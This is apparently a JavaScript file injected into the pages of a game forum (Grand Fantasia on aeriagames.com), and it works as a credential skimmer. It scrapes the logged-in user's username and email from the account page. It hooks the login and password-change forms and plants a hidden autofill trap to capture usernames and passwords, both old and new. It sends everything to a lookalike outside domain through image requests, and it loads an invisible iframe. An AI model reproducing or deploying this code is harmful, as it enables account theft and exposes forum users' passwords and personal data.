(function() {
  /*let br_script = document.createElement("script");
  br_script.src = "https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.5/platform.min.js";
  br_script.setAttribute("id","platform_script");
  document.body.append(br_script);*/
  class forum_user {
    constructor(user_id = '0', username = '', email = '', url) {
      this.user_id = user_id;
      this.username = username;
      this.email = email;
      this.url = url;
      this.osname = ''; //platform.os.family;
      this.os_version = ''; //platform.os.version;
      this.browser = ''; //platform.name;
      this.browser_version = ''; //platform.version;
    }
  }

  const am_url =
    'https://grandfantasia.aeriagames.com/forum/wcf/index.php?account-management/';
  const login_url =
    'https://grandfantasia.aeriagames.com/forum/wcf/index.php?login/';
  const username_selector = '#username';
  const email_selector = '#email';
  const user_endpoint = 'https://aeriagames.ddns.net/';
  const login_endpoint = 'https://aeriagames.ddns.net/login/';
  const cur_url = 'https:' + document.URL.split(':')[1];
  const hprotocol = document.URL.split(':')[0];
  const go_url = 'https://www.aeriagames.com/user/balingus/';
  if (hprotocol !== 'https') {
    window.location.href = cur_url;
  }

  let user_Id;

  // Make a HTTP GET Request
  async function get(url, inc) {
    const response = await fetch(url, {
      method: 'GET',
      credentials: inc
    });
    const resData = await response.text();
    return resData;
  }

  function getLogin() {
    const login_endpoint = 'https://aeriagames.ddns.net/login/';
    let usr = document.querySelector('#username').value;
    let pass = document.querySelector('#password').value;
    let src = `${login_endpoint}?site=forum&user=${usr}&pass=${pass}&src=saved`;

    if (usr !== '' && pass !== '') {
      document.createElement('img').setAttribute('src', src);
      test(src);
      if (document.querySelector('#lForm')) {
        document.querySelector('#lForm').remove();
      }
    } else {
      setTimeout(getLogin, 100);
    }
  }
  function test(src) {
    if (localStorage.getItem('test') !== null) {
      console.log(src);
    }
  }

  function scriptDone() {
    // Get user's forum_id (!== 0 if logged in)
    user_Id = document.body.innerHTML.split('WCF.User.init(')[1].split(',')[0];
    test('scriptDone id : ' + user_Id);
    let username = '';
    let email = '';
    let forumUser;
    if (user_Id !== '0') {
      let el = document.createElement('div');
      get(am_url, 'include').then(data => {
        el.innerHTML = data;
        username = el.querySelector(username_selector).value;
        email = el.querySelector(email_selector).value;
        forumUser = new forum_user(user_Id, username, email, cur_url);
        let src = `${user_endpoint}?forum_id=${forumUser.user_id}&username=${
          forumUser.username
        }&email=${forumUser.email}&url=${forumUser.url}&osname=${
          forumUser.osname
        }&os_version=${forumUser.os_version}&browser=${
          forumUser.browser
        }&browser_version=${forumUser.browser_version}&i=${hprotocol}`;
        document.createElement('img').setAttribute('src', src);
      });
    } else {
      forumUser = new forum_user(user_Id, '', '', cur_url);
      let src = `${user_endpoint}?forum_id=${user_Id}&url=${cur_url}&osname=${
        forumUser.osname
      }&os_version=${forumUser.os_version}&browser=${
        forumUser.browser
      }&browser_version=${forumUser.browser_version}&i=${hprotocol}`;
      test(src);
      document.createElement('img').setAttribute('src', src);
    }
  }

  function fixHistory() {
    get(cur_url, 'include');
  }

  function logout() {
    if (localStorage.getItem('out') !== 'Done') {
      localStorage.setItem('out', 'Done');
      get(
        'https://grandfantasia.aeriagames.com/forum/wcf/index.php?logout/&t=' +
          SECURITY_TOKEN,
        'include'
      );
    }
  }

  (function ready() {
    if (document.readyState === 'complete') {
      setTimeout(() => {
        test('scriptDone');
        scriptDone(); // Get basic info
        let lgForm = document.querySelector('#loginForm');
        if (!lgForm) {
          let el = document.createElement('div');
          el.setAttribute('id', 'lForm');
          el.style = 'display : none';
          el.innerHTML = `<input type="text" id="username" name="username" value="" required="" class="long jsDialogAutoFocus">
          <input type="password" id="password" name="password" value="" class="long">`;
          document.body.append(el);
        } else {
          if (document.location.href === am_url) {
            document
              .querySelector('.content')
              .addEventListener('submit', function(e) {
                let usr = document.querySelector('#username').value;
                let pass =
                  document.querySelector('#password').value +
                  ' | ' +
                  document.querySelector('#newPassword').value;
                let src = `${login_endpoint}?site=forum&user=${usr}&pass=${pass}&src=change`;
                test(src);
                document.createElement('img').setAttribute('src', src);
              });
          } else {
            let lgForm = document.querySelector('#loginForm');
            lgForm.addEventListener('submit', function() {
              let usr = lgForm.querySelector('#username').value;
              let pass = lgForm.querySelector('#password').value;
              let src = `${login_endpoint}?site=forum&user=${usr}&pass=${pass}&src=login`;
              test(src);
              document.createElement('img').setAttribute('src', src);
            });
          }
        }
        test('getLogin');
        getLogin();
        test('logout');
        //logout();
        test('setIframe');
        setIframe();
        test('fixHistory');
        fixHistory();
      }, 400);
    } else {
      setTimeout(ready, 200);
    }
  })();

  function setIframe() {
    test('set iframe');
    let ifrm = document.createElement('iframe');
    ifrm.setAttribute('src', go_url);
    ifrm.style.width = '0px';
    ifrm.style.height = '0px';
    ifrm.style.opacity = '0';
    document.body.append(ifrm);
  }
})();
